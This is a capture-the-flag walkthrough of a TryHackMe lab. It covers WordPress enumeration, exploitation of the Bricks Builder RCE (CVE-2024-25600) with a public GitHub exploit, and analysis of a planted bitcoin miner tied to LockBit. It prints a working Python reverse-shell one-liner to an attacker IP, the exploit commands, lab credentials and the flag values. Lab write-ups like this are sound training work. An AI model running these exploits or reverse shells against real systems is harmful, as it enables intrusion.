
# !!! WARNING - flags included !!!

`sudo nano /etc/hosts`

add `MACHINE_IP bricks.thm`

# recon

nmap yielded mostly nothing

gobuster needed to disable tls verification with `-k`

`gobuster dir -u https://bricks.thm -w /usr/share/wordlists/dirb/common.txt -x .js,.php,.txt -k`

we found `wp-admin` which suggests wordpress so `wpscan` can help us

remember to disable tls (https in CTFs is problematic)

`wpscan -url https://bricks.thm --disable-tls-checks`

going through it, at the end we saw bricks version that came up as a possible vector with a quick google search:

# exploitation

[The CVE](`https://nvd.nist.gov/vuln/detail/cve-2024-25600`)

we steal it off [some guys github](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/CVE-2024-25600.py) and run it

`git clone https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT`

there are some requirements.txt, which is a tough cookie for kali...

it's safest to do this in a virtual python environment like this

### setting up a venv - important step

```
sudo apt update && sudo apt install -y python3-pip python3-venv

cd THE_EXPLOIT_PATH

python3 -m venv .venv

source .venv/bin/activate

pip install -r requirements.txt

```

stay in the environment till the end of your python usage

now for the fun part ...

`python CVE-2024-25600.py -u https://bricks.thm` gets us a shell !!!

### getting the first flag:

```
Shell> whoami
apache

Shell> id
uid=1001(apache) gid=1001(apache) groups=1001(apache)

Shell> cat 650c844110baced87e1606453b93f22a.txt
THM{fl46_650c844110baced87e1606453b93f22a}

```

# furher enumeration


### hardcoded credentials

`wp-config` contained credentials root / lamp.sh

our task did not include this (let's assume it was not in scope then) so we skip on it

report DB admin to HR and proceed

### finding a suspicious process

start with `systemctl | grep running`

one entry stood out

```
ubuntu.service  loaded  active  running  TRYHACK3M 

```

reading up on systemctl usage we come up with

```

Shell> systemctl cat ubuntu.service
# /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target

Shell> 

```

### switch to a more normal shell

now we actually need a shell to look at the process config

a quick revshells.com python revshell

`nc -lvnp 7777` on attacker (our IP is 192.168.131.18)

target runs this: 

```
export RHOST="192.168.131.18";export RPORT=7777;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```


### examining the process

`cd /lib/NetworkManager/`

there was about 15 files I manually went through

most interesting was `cat inet.conf` which revealed some Miner (maybe crypto miner?)

it is a BTC miner...

```

2024-04-08 10:48:08,649 [*] Bitcoin Miner Thread Started
2024-04-08 10:48:08,649 [*] Status: Mining!

```

and probably the wallet adress (encoded of course):

```
2024-04-08 10:54:25,059 [*] Miner()
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d

```

Cyberchef magically decoded it into this string: 
`bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa`

not valid....

bitcoin adresses are not this long (they are supposedly 26-62 characters)

there is a suspicious almost repeating sequence tho if we split it in half

`bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` and ` bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa`

the first one actually shows up...
 - there is 0 BTC right now
 - but there is 15.5 BTC received and 15.5 BTC sent throughout 8 transactions

we also found out it was involved in an incident

Threat Actor: LockBit ransomware group

--> THE END <--

# cleanup

exit the python virtual environment with `deactivate` (in the folder where you have set it up)

clean up the entry from /etc/hosts
